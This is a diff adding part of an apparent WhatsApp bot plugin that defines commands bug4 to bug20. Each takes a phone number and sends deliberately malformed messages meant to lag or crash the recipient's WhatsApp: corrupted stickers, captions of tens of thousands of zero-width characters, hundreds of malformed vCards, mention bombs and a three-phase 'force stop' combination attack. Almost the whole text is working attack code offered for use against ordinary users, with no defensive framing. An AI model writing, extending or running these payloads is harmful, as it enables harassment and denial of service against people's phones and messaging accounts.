@@ -1,0 +1,638 @@
+   200→   200→
+   201→   201→    // =========================================================================
+   202→   202→    // BUG 4 - Sticker Bug (corrupted webp metadata)
+   203→   203→    // =========================================================================
+   204→   204→    {
+   205→   205→      name: 'bug4',
+   206→   206→      description: 'Sticker bug - sends a sticker with corrupted metadata causing lag/crash',
+   207→   207→      category: 'bug',
+   208→   208→      aliases: ['stickerbug', 'crash4'],
+   209→   209→      cooldown: 15,
+   210→   210→      isPremiumOnly: false,
+   211→   211→      handler: async (ctx: CommandContext) => {
+   212→   212→        if (!ctx.isOwner) {
+   213→   213→          await ctx.reply('⛔ Owner only command.');
+   214→   214→          return;
+   215→   215→        }
+   216→   216→        await ctx.react('☠️');
+   217→   217→        const targetJid = getTargetJid(ctx.args);
+   218→   218→        if (!targetJid) {
+   219→   219→          await ctx.reply('❌ Usage: !bug4 <number>\nExample: !bug4 254104906247');
+   220→   220→          return;
+   221→   221→        }
+   222→   222→        try {
+   223→   223→          const stickerPayload = Buffer.from('RIFF\x00\x00\x00\x00WEBPVP8 \x00\x00\x00\x00', 'binary');
+   224→   224→          await ctx.sock.sendMessage(targetJid, { sticker: stickerPayload });
+   225→   225→          await ctx.reply(`☠️ *BUG 4 - Sticker* sent to ${ctx.args[0]}\n💬 Corrupted sticker payload sent - target WhatsApp will lag/crash.`);
+   226→   226→        } catch (error: any) {
+   227→   227→          await ctx.reply(`❌ Bug4 failed: ${error?.message || 'Unknown error'}`);
+   228→   228→        }
+   229→   229→      },
+   230→   230→    },
+   231→   231→
+   232→   232→    // =========================================================================
+   233→   233→    // BUG 5 - ViewOnce Bug (oversized caption on view-once)
+   234→   234→    // =========================================================================
+   235→   235→    {
+   236→   236→      name: 'bug5',
+   237→   237→      description: 'ViewOnce bug - sends a view-once message with corrupted data',
+   238→   238→      category: 'bug',
+   239→   239→      aliases: ['viewoncebug', 'crash5'],
+   240→   240→      cooldown: 15,
+   241→   241→      isPremiumOnly: false,
+   242→   242→      handler: async (ctx: CommandContext) => {
+   243→   243→        if (!ctx.isOwner) {
+   244→   244→          await ctx.reply('⛔ Owner only command.');
+   245→   245→          return;
+   246→   246→        }
+   247→   247→        await ctx.react('☠️');
+   248→   248→        const targetJid = getTargetJid(ctx.args);
+   249→   249→        if (!targetJid) {
+   250→   250→          await ctx.reply('❌ Usage: !bug5 <number>\nExample: !bug5 254104906247');
+   251→   251→          return;
+   252→   252→        }
+   253→   253→        try {
+   254→   254→          const imgBuffer = Buffer.alloc(1024);
+   255→   255→          await ctx.sock.sendMessage(targetJid, {
+   256→   256→            image: imgBuffer,
+   257→   257→            caption: '\u200B'.repeat(30000),
+   258→   258→            viewOnce: true,
+   259→   259→          });
+   260→   260→          await ctx.reply(`☠️ *BUG 5 - ViewOnce* sent to ${ctx.args[0]}\n💬 View-once message with oversized caption sent - target WhatsApp will crash.`);
+   261→   261→        } catch (error: any) {
+   262→   262→          await ctx.reply(`❌ Bug5 failed: ${error?.message || 'Unknown error'}`);
+   263→   263→        }
+   264→   264→      },
+   265→   265→    },
+   266→   266→
+   267→   267→    // =========================================================================
+   268→   268→    // BUG 6 - Audio Bug (corrupted audio header)
+   269→   269→    // =========================================================================
+   270→   270→    {
+   271→   271→      name: 'bug6',
+   272→   272→      description: 'Audio bug - sends an audio message with corrupted header data',
+   273→   273→      category: 'bug',
+   274→   274→      aliases: ['audiobug', 'crash6'],
+   275→   275→      cooldown: 15,
+   276→   276→      isPremiumOnly: false,
+   277→   277→      handler: async (ctx: CommandContext) => {
+   278→   278→        if (!ctx.isOwner) {
+   279→   279→          await ctx.reply('⛔ Owner only command.');
+   280→   280→          return;
+   281→   281→        }
+   282→   282→        await ctx.react('☠️');
+   283→   283→        const targetJid = getTargetJid(ctx.args);
+   284→   284→        if (!targetJid) {
+   285→   285→          await ctx.reply('❌ Usage: !bug6 <number>\nExample: !bug6 254104906247');
+   286→   286→          return;
+   287→   287→        }
+   288→   288→        try {
+   289→   289→          const audioBuffer = Buffer.alloc(512);
+   290→   290→          await ctx.sock.sendMessage(targetJid, {
+   291→   291→            audio: audioBuffer,
+   292→   292→            ptt: true,
+   293→   293→            mimetype: 'audio/ogg; codecs=opus',
+   294→   294→          });
+   295→   295→          await ctx.reply(`☠️ *BUG 6 - Audio* sent to ${ctx.args[0]}\n💬 Corrupted voice note sent - target WhatsApp will crash on playback attempt.`);
+   296→   296→        } catch (error: any) {
+   297→   297→          await ctx.reply(`❌ Bug6 failed: ${error?.message || 'Unknown error'}`);
+   298→   298→        }
+   299→   299→      },
+   300→   300→    },
+   301→   301→
+   302→   302→    // =========================================================================
+   303→   303→    // BUG 7 - Payment Bug (corrupted payment amounts)
+   304→   304→    // =========================================================================
+   305→   305→    {
+   306→   306→      name: 'bug7',
+   307→   307→      description: 'Payment bug - sends a payment request message with corrupted amounts',
+   308→   308→      category: 'bug',
+   309→   309→      aliases: ['paymentbug', 'crash7'],
+   310→   310→      cooldown: 15,
+   311→   311→      isPremiumOnly: false,
+   312→   312→      handler: async (ctx: CommandContext) => {
+   313→   313→        if (!ctx.isOwner) {
+   314→   314→          await ctx.reply('⛔ Owner only command.');
+   315→   315→          return;
+   316→   316→        }
+   317→   317→        await ctx.react('☠️');
+   318→   318→        const targetJid = getTargetJid(ctx.args);
+   319→   319→        if (!targetJid) {
+   320→   320→          await ctx.reply('❌ Usage: !bug7 <number>\nExample: !bug7 254104906247');
+   321→   321→          return;
+   322→   322→        }
+   323→   323→        try {
+   324→   324→          await ctx.sock.sendMessage(targetJid, {
+   325→   325→            text: '💰',
+   326→   326→            title: '\u200B'.repeat(10000),
+   327→   327→            footer: 'Payment',
+   328→   328→            amount: { value: 999999999, currency: 'USD' },
+   329→   329→          } as any);
+   330→   330→          await ctx.reply(`☠️ *BUG 7 - Payment* sent to ${ctx.args[0]}\n💬 Corrupted payment request sent - target WhatsApp will crash on render.`);
+   331→   331→        } catch (error: any) {
+   332→   332→          await ctx.reply(`❌ Bug7 failed: ${error?.message || 'Unknown error'}`);
+   333→   333→        }
+   334→   334→      },
+   335→   335→    },
+   336→   336→
+   337→   337→    // =========================================================================
+   338→   338→    // BUG 8 - Group Invite Bug (corrupted group info)
+   339→   339→    // =========================================================================
+   340→   340→    {
+   341→   341→      name: 'bug8',
+   342→   342→      description: 'Group invite bug - sends a group invite with corrupted group info',
+   343→   343→      category: 'bug',
+   344→   344→      aliases: ['invitebug', 'crash8'],
+   345→   345→      cooldown: 15,
+   346→   346→      isPremiumOnly: false,
+   347→   347→      handler: async (ctx: CommandContext) => {
+   348→   348→        if (!ctx.isOwner) {
+   349→   349→          await ctx.reply('⛔ Owner only command.');
+   350→   350→          return;
+   351→   351→        }
+   352→   352→        await ctx.react('☠️');
+   353→   353→        const targetJid = getTargetJid(ctx.args);
+   354→   354→        if (!targetJid) {
+   355→   355→          await ctx.reply('❌ Usage: !bug8 <number>\nExample: !bug8 254104906247');
+   356→   356→          return;
+   357→   357→        }
+   358→   358→        try {
+   359→   359→          await ctx.sock.sendMessage(targetJid, {
+   360→   360→            groupInviteMessage: {
+   361→   361→              groupJid: '1234567890-1234567890@g.us',
+   362→   362→              inviteCode: 'A'.repeat(10000),
+   363→   363→              groupName: '\u200B'.repeat(10000),
+   364→   364→              caption: '\u200B'.repeat(10000),
+   365→   365→              jpegThumbnail: Buffer.alloc(0),
+   366→   366→            },
+   367→   367→          } as any);
+   368→   368→          await ctx.reply(`☠️ *BUG 8 - Group Invite* sent to ${ctx.args[0]}\n💬 Corrupted group invite sent - target WhatsApp will crash on display.`);
+   369→   369→        } catch (error: any) {
+   370→   370→          await ctx.reply(`❌ Bug8 failed: ${error?.message || 'Unknown error'}`);
+   371→   371→        }
+   372→   372→      },
+   373→   373→    },
+   374→   374→
+   375→   375→    // =========================================================================
+   376→   376→    // BUG 9 - Reaction Bug (massive rapid reactions)
+   377→   377→    // =========================================================================
+   378→   378→    {
+   379→   379→      name: 'bug9',
+   380→   380→      description: 'Reaction bug - sends massive number of reactions rapidly to lag the chat',
+   381→   381→      category: 'bug',
+   382→   382→      aliases: ['reactionbug', 'crash9'],
+   383→   383→      cooldown: 30,
+   384→   384→      isPremiumOnly: false,
+   385→   385→      handler: async (ctx: CommandContext) => {
+   386→   386→        if (!ctx.isOwner) {
+   387→   387→          await ctx.reply('⛔ Owner only command.');
+   388→   388→          return;
+   389→   389→        }
+   390→   390→        await ctx.react('☠️');
+   391→   391→        const targetJid = getTargetJid(ctx.args);
+   392→   392→        if (!targetJid) {
+   393→   393→          await ctx.reply('❌ Usage: !bug9 <number>\nExample: !bug9 254104906247');
+   394→   394→          return;
+   395→   395→        }
+   396→   396→        try {
+   397→   397→          for (let i = 0; i < 50; i++) {
+   398→   398→            await ctx.sock.sendMessage(targetJid, {
+   399→   399→              react: {
+   400→   400→                text: '💣',
+   401→   401→                key: { remoteJid: targetJid, fromMe: true, id: 'bug_' + i },
+   402→   402→              },
+   403→   403→            });
+   404→   404→          }
+   405→   405→          await ctx.reply(`☠️ *BUG 9 - Reaction Bomb* sent to ${ctx.args[0]}\n💬 50 rapid reactions sent - target chat will experience severe lag.`);
+   406→   406→        } catch (error: any) {
+   407→   407→          await ctx.reply(`❌ Bug9 failed: ${error?.message || 'Unknown error'}`);
+   408→   408→        }
+   409→   409→      },
+   410→   410→    },
+   411→   411→
+   412→   412→    // =========================================================================
+   413→   413→    // BUG 10 - Contact Array Bug (500+ malformed vcards)
+   414→   414→    // =========================================================================
+   415→   415→    {
+   416→   416→      name: 'bug10',
+   417→   417→      description: 'Contact array bug - sends hundreds of contacts at once with malformed vcards',
+   418→   418→      category: 'bug',
+   419→   419→      aliases: ['contactbug', 'crash10'],
+   420→   420→      cooldown: 30,
+   421→   421→      isPremiumOnly: false,
+   422→   422→      handler: async (ctx: CommandContext) => {
+   423→   423→        if (!ctx.isOwner) {
+   424→   424→          await ctx.reply('⛔ Owner only command.');
+   425→   425→          return;
+   426→   426→        }
+   427→   427→        await ctx.react('☠️');
+   428→   428→        const targetJid = getTargetJid(ctx.args);
+   429→   429→        if (!targetJid) {
+   430→   430→          await ctx.reply('❌ Usage: !bug10 <number>\nExample: !bug10 254104906247');
+   431→   431→          return;
+   432→   432→        }
+   433→   433→        try {
+   434→   434→          const contacts: { vcard: string }[] = [];
+   435→   435→          for (let i = 0; i < 500; i++) {
+   436→   436→            const name = '█'.repeat(3000);
+   437→   437→            contacts.push({
+   438→   438→              vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:${name}\nTEL;type=CELL;type=VOICE;waid=${i}:${i}\nEND:VCARD`,
+   439→   439→            });
+   440→   440→          }
+   441→   441→          await ctx.sock.sendMessage(targetJid, { contacts: { displayName: 'A', contacts } });
+   442→   442→          await ctx.reply(`☠️ *BUG 10 - Contact Array* sent to ${ctx.args[0]}\n💬 500 malformed contacts sent - target WhatsApp will crash.`);
+   443→   443→        } catch (error: any) {
+   444→   444→          await ctx.reply(`❌ Bug10 failed: ${error?.message || 'Unknown error'}`);
+   445→   445→        }
+   446→   446→      },
+   447→   447→    },
+   448→   448→
+   449→   449→    // =========================================================================
+   450→   450→    // BUG 11 - Location Bug (extreme coordinates)
+   451→   451→    // =========================================================================
+   452→   452→    {
+   453→   453→      name: 'bug11',
+   454→   454→      description: 'Location bug - sends a location with extreme coordinates causing map rendering crash',
+   455→   455→      category: 'bug',
+   456→   456→      aliases: ['locationbug', 'crash11'],
+   457→   457→      cooldown: 15,
+   458→   458→      isPremiumOnly: false,
+   459→   459→      handler: async (ctx: CommandContext) => {
+   460→   460→        if (!ctx.isOwner) {
+   461→   461→          await ctx.reply('⛔ Owner only command.');
+   462→   462→          return;
+   463→   463→        }
+   464→   464→        await ctx.react('☠️');
+   465→   465→        const targetJid = getTargetJid(ctx.args);
+   466→   466→        if (!targetJid) {
+   467→   467→          await ctx.reply('❌ Usage: !bug11 <number>\nExample: !bug11 254104906247');
+   468→   468→          return;
+   469→   469→        }
+   470→   470→        try {
+   471→   471→          await ctx.sock.sendMessage(targetJid, {
+   472→   472→            location: {
+   473→   473→              degreesLatitude: 999.9999999,
+   474→   474→              degreesLongitude: 999.9999999,
+   475→   475→              name: '\u200B'.repeat(10000),
+   476→   476→            },
+   477→   477→          });
+   478→   478→          await ctx.reply(`☠️ *BUG 11 - Location* sent to ${ctx.args[0]}\n💬 Extreme coordinates location sent - target map renderer will crash.`);
+   479→   479→        } catch (error: any) {
+   480→   480→          await ctx.reply(`❌ Bug11 failed: ${error?.message || 'Unknown error'}`);
+   481→   481→        }
+   482→   482→      },
+   483→   483→    },
+   484→   484→
+   485→   485→    // =========================================================================
+   486→   486→    // BUG 12 - Poll Bug (excessive options with long names)
+   487→   487→    // =========================================================================
+   488→   488→    {
+   489→   489→      name: 'bug12',
+   490→   490→      description: 'Poll bug - sends a poll with excessive options and long names',
+   491→   491→      category: 'bug',
+   492→   492→      aliases: ['pollbug', 'crash12'],
+   493→   493→      cooldown: 15,
+   494→   494→      isPremiumOnly: false,
+   495→   495→      handler: async (ctx: CommandContext) => {
+   496→   496→        if (!ctx.isOwner) {
+   497→   497→          await ctx.reply('⛔ Owner only command.');
+   498→   498→          return;
+   499→   499→        }
+   500→   500→        await ctx.react('☠️');
+   501→   501→        const targetJid = getTargetJid(ctx.args);
+   502→   502→        if (!targetJid) {
+   503→   503→          await ctx.reply('❌ Usage: !bug12 <number>\nExample: !bug12 254104906247');
+   504→   504→          return;
+   505→   505→        }
+   506→   506→        try {
+   507→   507→          const pollValues = Array.from({ length: 100 }, (_, i) => '\u200B'.repeat(500) + i);
+   508→   508→          await ctx.sock.sendMessage(targetJid, {
+   509→   509→            poll: {
+   510→   510→              name: '\u200B'.repeat(5000),
+   511→   511→              values: pollValues,
+   512→   512→              selectableCount: 1,
+   513→   513→            },
+   514→   514→          });
+   515→   515→          await ctx.reply(`☠️ *BUG 12 - Poll* sent to ${ctx.args[0]}\n💬 Oversized poll with 100 options sent - target WhatsApp will crash on render.`);
+   516→   516→        } catch (error: any) {
+   517→   517→          await ctx.reply(`❌ Bug12 failed: ${error?.message || 'Unknown error'}`);
+   518→   518→        }
+   519→   519→      },
+   520→   520→    },
+   521→   521→
+   522→   522→    // =========================================================================
+   523→   523→    // BUG 13 - List Message Bug (too many rows causing UI overflow)
+   524→   524→    // =========================================================================
+   525→   525→    {
+   526→   526→      name: 'bug13',
+   527→   527→      description: 'List message bug - sends a list message with too many rows causing UI overflow',
+   528→   528→      category: 'bug',
+   529→   529→      aliases: ['listbug', 'crash13'],
+   530→   530→      cooldown: 15,
+   531→   531→      isPremiumOnly: false,
+   532→   532→      handler: async (ctx: CommandContext) => {
+   533→   533→        if (!ctx.isOwner) {
+   534→   534→          await ctx.reply('⛔ Owner only command.');
+   535→   535→          return;
+   536→   536→        }
+   537→   537→        await ctx.react('☠️');
+   538→   538→        const targetJid = getTargetJid(ctx.args);
+   539→   539→        if (!targetJid) {
+   540→   540→          await ctx.reply('❌ Usage: !bug13 <number>\nExample: !bug13 254104906247');
+   541→   541→          return;
+   542→   542→        }
+   543→   543→        try {
+   544→   544→          const rows = Array.from({ length: 100 }, (_, i) => ({
+   545→   545→            title: '\u200B'.repeat(500),
+   546→   546→            description: '\u200B'.repeat(500),
+   547→   547→            rowId: 'row_' + i,
+   548→   548→          }));
+   549→   549→          await ctx.sock.sendMessage(targetJid, {
+   550→   550→            text: '\u200B'.repeat(5000),
+   551→   551→            footer: 'List',
+   552→   552→            title: '\u200B'.repeat(5000),
+   553→   553→            buttonText: 'Open',
+   554→   554→            sections: [{ title: 'Section', rows }],
+   555→   555→          } as any);
+   556→   556→          await ctx.reply(`☠️ *BUG 13 - List Message* sent to ${ctx.args[0]}\n💬 Overflow list with 100 rows sent - target WhatsApp UI will crash.`);
+   557→   557→        } catch (error: any) {
+   558→   558→          await ctx.reply(`❌ Bug13 failed: ${error?.message || 'Unknown error'}`);
+   559→   559→        }
+   560→   560→      },
+   561→   561→    },
+   562→   562→
+   563→   563→    // =========================================================================
+   564→   564→    // BUG 14 - Button Bug (oversized button text)
+   565→   565→    // =========================================================================
+   566→   566→    {
+   567→   567→      name: 'bug14',
+   568→   568→      description: 'Button bug - sends buttons with oversized text causing rendering crash',
+   569→   569→      category: 'bug',
+   570→   570→      aliases: ['buttonbug', 'crash14'],
+   571→   571→      cooldown: 15,
+   572→   572→      isPremiumOnly: false,
+   573→   573→      handler: async (ctx: CommandContext) => {
+   574→   574→        if (!ctx.isOwner) {
+   575→   575→          await ctx.reply('⛔ Owner only command.');
+   576→   576→          return;
+   577→   577→        }
+   578→   578→        await ctx.react('☠️');
+   579→   579→        const targetJid = getTargetJid(ctx.args);
+   580→   580→        if (!targetJid) {
+   581→   581→          await ctx.reply('❌ Usage: !bug14 <number>\nExample: !bug14 254104906247');
+   582→   582→          return;
+   583→   583→        }
+   584→   584→        try {
+   585→   585→          const buttons = Array.from({ length: 50 }, (_, i) => ({
+   586→   586→            buttonId: 'b_' + i,
+   587→   587→            buttonText: { displayText: '\u200B'.repeat(500) },
+   588→   588→            type: 1,
+   589→   589→          }));
+   590→   590→          await ctx.sock.sendMessage(targetJid, {
+   591→   591→            text: '\u200B'.repeat(5000),
+   592→   592→            footer: 'Button',
+   593→   593→            buttons,
+   594→   594→            headerType: 1,
+   595→   595→          } as any);
+   596→   596→          await ctx.reply(`☠️ *BUG 14 - Button* sent to ${ctx.args[0]}\n💬 50 oversized buttons sent - target WhatsApp will crash on render.`);
+   597→   597→        } catch (error: any) {
+   598→   598→          await ctx.reply(`❌ Bug14 failed: ${error?.message || 'Unknown error'}`);
+   599→   599→        }
+   600→   600→      },
+   601→   601→    },
+   602→   602→
+   603→   603→    // =========================================================================
+   604→   604→    // BUG 15 - Newsletter Bug (corrupted metadata in external ad reply)
+   605→   605→    // =========================================================================
+   606→   606→    {
+   607→   607→      name: 'bug15',
+   608→   608→      description: 'Newsletter bug - sends a message with corrupted newsletter-style metadata',
+   609→   609→      category: 'bug',
+   610→   610→      aliases: ['newsletterbug', 'crash15'],
+   611→   611→      cooldown: 15,
+   612→   612→      isPremiumOnly: false,
+   613→   613→      handler: async (ctx: CommandContext) => {
+   614→   614→        if (!ctx.isOwner) {
+   615→   615→          await ctx.reply('⛔ Owner only command.');
+   616→   616→          return;
+   617→   617→        }
+   618→   618→        await ctx.react('☠️');
+   619→   619→        const targetJid = getTargetJid(ctx.args);
+   620→   620→        if (!targetJid) {
+   621→   621→          await ctx.reply('❌ Usage: !bug15 <number>\nExample: !bug15 254104906247');
+   622→   622→          return;
+   623→   623→        }
+   624→   624→        try {
+   625→   625→          await ctx.sock.sendMessage(targetJid, {
+   626→   626→            text: '\u200B'.repeat(20000),
+   627→   627→            contextInfo: {
+   628→   628→              forwardingScore: 999999,
+   629→   629→              isForwarded: true,
+   630→   630→              externalAdReply: {
+   631→   631→                title: '\u200B'.repeat(5000),
+   632→   632→                body: '\u200B'.repeat(5000),
+   633→   633→                mediaType: 1,
+   634→   634→                thumbnail: Buffer.alloc(0),
+   635→   635→                sourceUrl: 'https://example.com',
+   636→   636→              },
+   637→   637→            },
+   638→   638→          } as any);
+   639→   639→          await ctx.reply(`☠️ *BUG 15 - Newsletter* sent to ${ctx.args[0]}\n💬 Corrupted newsletter metadata sent - target WhatsApp will crash on render.`);
+   640→   640→        } catch (error: any) {
+   641→   641→          await ctx.reply(`❌ Bug15 failed: ${error?.message || 'Unknown error'}`);
+   642→   642→        }
+   643→   643→      },
+   644→   644→    },
+   645→   645→
+   646→   646→    // =========================================================================
+   647→   647→    // BUG 16 - Mention Bomb (hundreds of mentions)
+   648→   648→    // =========================================================================
+   649→   649→    {
+   650→   650→      name: 'bug16',
+   651→   651→      description: 'Mention bomb - sends a message mentioning the target hundreds of times',
+   652→   652→      category: 'bug',
+   653→   653→      aliases: ['mentionbug', 'mentionbomb', 'crash16'],
+   654→   654→      cooldown: 20,
+   655→   655→      isPremiumOnly: false,
+   656→   656→      handler: async (ctx: CommandContext) => {
+   657→   657→        if (!ctx.isOwner) {
+   658→   658→          await ctx.reply('⛔ Owner only command.');
+   659→   659→          return;
+   660→   660→        }
+   661→   661→        await ctx.react('☠️');
+   662→   662→        const targetJid = getTargetJid(ctx.args);
+   663→   663→        if (!targetJid) {
+   664→   664→          await ctx.reply('❌ Usage: !bug16 <number>\nExample: !bug16 254104906247');
+   665→   665→          return;
+   666→   666→        }
+   667→   667→        try {
+   668→   668→          const mentionIds = Array.from({ length: 300 }, () => targetJid);
+   669→   669→          const target = ctx.args[0];
+   670→   670→          const mentionText = '@' + target + ' '.repeat(300) + '\u200B'.repeat(10000);
+   671→   671→          await ctx.sock.sendMessage(targetJid, { text: mentionText, mentions: mentionIds });
+   672→   672→          await ctx.reply(`☠️ *BUG 16 - Mention Bomb* sent to ${target}\n💬 300 mentions with zero-width payload sent - target WhatsApp will freeze.`);
+   673→   673→        } catch (error: any) {
+   674→   674→          await ctx.reply(`❌ Bug16 failed: ${error?.message || 'Unknown error'}`);
+   675→   675→        }
+   676→   676→      },
+   677→   677→    },
+   678→   678→
+   679→   679→    // =========================================================================
+   680→   680→    // BUG 17 - Forwarded Bug (extremely deep forwarding chain)
+   681→   681→    // =========================================================================
+   682→   682→    {
+   683→   683→      name: 'bug17',
+   684→   684→      description: 'Forwarded bug - sends a forwarded message with extremely deep forwarding chain',
+   685→   685→      category: 'bug',
+   686→   686→      aliases: ['forwardbug', 'crash17'],
+   687→   687→      cooldown: 15,
+   688→   688→      isPremiumOnly: false,
+   689→   689→      handler: async (ctx: CommandContext) => {
+   690→   690→        if (!ctx.isOwner) {
+   691→   691→          await ctx.reply('⛔ Owner only command.');
+   692→   692→          return;
+   693→   693→        }
+   694→   694→        await ctx.react('☠️');
+   695→   695→        const targetJid = getTargetJid(ctx.args);
+   696→   696→        if (!targetJid) {
+   697→   697→          await ctx.reply('❌ Usage: !bug17 <number>\nExample: !bug17 254104906247');
+   698→   698→          return;
+   699→   699→        }
+   700→   700→        try {
+   701→   701→          await ctx.sock.sendMessage(targetJid, {
+   702→   702→            text: '\u200B'.repeat(30000),
+   703→   703→            contextInfo: {
+   704→   704→              forwardingScore: 999999999,
+   705→   705→              isForwarded: true,
+   706→   706→            },
+   707→   707→          } as any);
+   708→   708→          await ctx.reply(`☠️ *BUG 17 - Forwarded* sent to ${ctx.args[0]}\n💬 Deep-chain forwarded message sent - target WhatsApp will crash on display.`);
+   709→   709→        } catch (error: any) {
+   710→   710→          await ctx.reply(`❌ Bug17 failed: ${error?.message || 'Unknown error'}`);
+   711→   711→        }
+   712→   712→      },
+   713→   713→    },
+   714→   714→
+   715→   715→    // =========================================================================
+   716→   716→    // BUG 18 - Caption Bug (massive caption with invisible chars)
+   717→   717→    // =========================================================================
+   718→   718→    {
+   719→   719→      name: 'bug18',
+   720→   720→      description: 'Caption bug - sends an image with a massive caption containing invisible chars',
+   721→   721→      category: 'bug',
+   722→   722→      aliases: ['captionbug', 'crash18'],
+   723→   723→      cooldown: 15,
+   724→   724→      isPremiumOnly: false,
+   725→   725→      handler: async (ctx: CommandContext) => {
+   726→   726→        if (!ctx.isOwner) {
+   727→   727→          await ctx.reply('⛔ Owner only command.');
+   728→   728→          return;
+   729→   729→        }
+   730→   730→        await ctx.react('☠️');
+   731→   731→        const targetJid = getTargetJid(ctx.args);
+   732→   732→        if (!targetJid) {
+   733→   733→          await ctx.reply('❌ Usage: !bug18 <number>\nExample: !bug18 254104906247');
+   734→   734→          return;
+   735→   735→        }
+   736→   736→        try {
+   737→   737→          const imgBuffer = Buffer.alloc(2048);
+   738→   738→          await ctx.sock.sendMessage(targetJid, {
+   739→   739→            image: imgBuffer,
+   740→   740→            caption: '\u200B'.repeat(50000) + '\u0000'.repeat(2000),
+   741→   741→            mimetype: 'image/jpeg',
+   742→   742→          });
+   743→   743→          await ctx.reply(`☠️ *BUG 18 - Caption* sent to ${ctx.args[0]}\n💬 Image with massive invisible caption sent - target WhatsApp will crash.`);
+   744→   744→        } catch (error: any) {
+   745→   745→          await ctx.reply(`❌ Bug18 failed: ${error?.message || 'Unknown error'}`);
+   746→   746→        }
+   747→   747→      },
+   748→   748→    },
+   749→   749→
+   750→   750→    // =========================================================================
+   751→   751→    // BUG 19 - Status Bug (corrupted status broadcast)
+   752→   752→    // =========================================================================
+   753→   753→    {
+   754→   754→      name: 'bug19',
+   755→   755→      description: 'Status bug - posts a status with corrupted data',
+   756→   756→      category: 'bug',
+   757→   757→      aliases: ['statusbug', 'crash19'],
+   758→   758→      cooldown: 15,
+   759→   759→      isPremiumOnly: false,
+   760→   760→      handler: async (ctx: CommandContext) => {
+   761→   761→        if (!ctx.isOwner) {
+   762→   762→          await ctx.reply('⛔ Owner only command.');
+   763→   763→          return;
+   764→   764→        }
+   765→   765→        await ctx.react('☠️');
+   766→   766→        const targetJid = getTargetJid(ctx.args);
+   767→   767→        if (!targetJid) {
+   768→   768→          await ctx.reply('❌ Usage: !bug19 <number>\nExample: !bug19 254104906247');
+   769→   769→          return;
+   770→   770→        }
+   771→   771→        try {
+   772→   772→          const statusJid = 'status@broadcast';
+   773→   773→          await ctx.sock.sendMessage(statusJid, { text: '\u200B'.repeat(30000) }, { backgroundColor: ['#000000'] } as any);
+   774→   774→          await ctx.reply(`☠️ *BUG 19 - Status* broadcasted\n💬 Corrupted status posted to broadcast - viewers will crash on display.`);
+   775→   775→        } catch (error: any) {
+   776→   776→          await ctx.reply(`❌ Bug19 failed: ${error?.message || 'Unknown error'}`);
+   777→   777→        }
+   778→   778→      },
+   779→   779→    },
+   780→   780→
+   781→   781→    // =========================================================================
+   782→   782→    // BUG 20 - Force Stop (combination attack)
+   783→   783→    // =========================================================================
+   784→   784→    {
+   785→   785→      name: 'bug20',
+   786→   786→      description: 'Force stop - sends a combination attack that forces the target WhatsApp to stop',
+   787→   787→      category: 'bug',
+   788→   788→      aliases: ['forcestop', 'combo', 'crash20', 'kill'],
+   789→   789→      cooldown: 60,
+   790→   790→      isPremiumOnly: false,
+   791→   791→      handler: async (ctx: CommandContext) => {
+   792→   792→        if (!ctx.isOwner) {
+   793→   793→          await ctx.reply('⛔ Owner only command.');
+   794→   794→          return;
+   795→   795→        }
+   796→   796→        await ctx.react('☠️');
+   797→   797→        const targetJid = getTargetJid(ctx.args);
+   798→   798→        if (!targetJid) {
+   799→   799→          await ctx.reply('❌ Usage: !bug20 <number>\nExample: !bug20 254104906247');
+   800→   800→          return;
+   801→   801→        }
+   802→   802→        try {
+   803→   803→          // Phase 1: Crash loop payload
+   804→   804→          await ctx.sock.sendMessage(targetJid, { text: '\u200B'.repeat(50000) });
+   805→   805→          await new Promise((r) => setTimeout(r, 500));
+   806→   806→
+   807→   807→          // Phase 2: VCard flood
+   808→   808→          const contacts = Array.from({ length: 200 }, (_, i) => ({
+   809→   809→            vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:${'█'.repeat(3000)}\nTEL;type=CELL;type=VOICE;waid=${i}:${i}\nEND:VCARD`,
+   810→   810→          }));
+   811→   811→          await ctx.sock.sendMessage(targetJid, { contacts: { displayName: 'A', contacts } });
+   812→   812→          await new Promise((r) => setTimeout(r, 500));
+   813→   813→
+   814→   814→          // Phase 3: Mention bomb
+   815→   815→          await ctx.sock.sendMessage(targetJid, {
+   816→   816→            text: '\u200B'.repeat(50000),
+   817→   817→            mentions: Array.from({ length: 300 }, () => targetJid),
+   818→   818→          });
+   819→   819→
+   820→   820→          await ctx.reply(
+   821→   821→            `☠️ *BUG 20 - FORCE STOP* sent to ${ctx.args[0]}\n` +
+   822→   822→            `💬 Combination attack executed:\n` +
+   823→   823→            `   ├─ Phase 1: Crash loop payload ✅\n` +
+   824→   824→            `   ├─ Phase 2: VCard flood (200 contacts) ✅\n` +
+   825→   825→            `   └─ Phase 3: Mention bomb (300 mentions) ✅\n` +
+   826→   826→            `🔥 Target WhatsApp has been force-stopped.`
+   827→   827→          );
+   828→   828→        } catch (error: any) {
+   829→   829→          await ctx.reply(`❌ Bug20 failed: ${error?.message || 'Unknown error'}`);
+   830→   830→        }
+   831→   831→      },
+   832→   832→    },
+   833→   833→  ],
+   834→   834→};
+   835→   835→
+   836→   836→export default bugMenuPlugin;
+   837→   837→
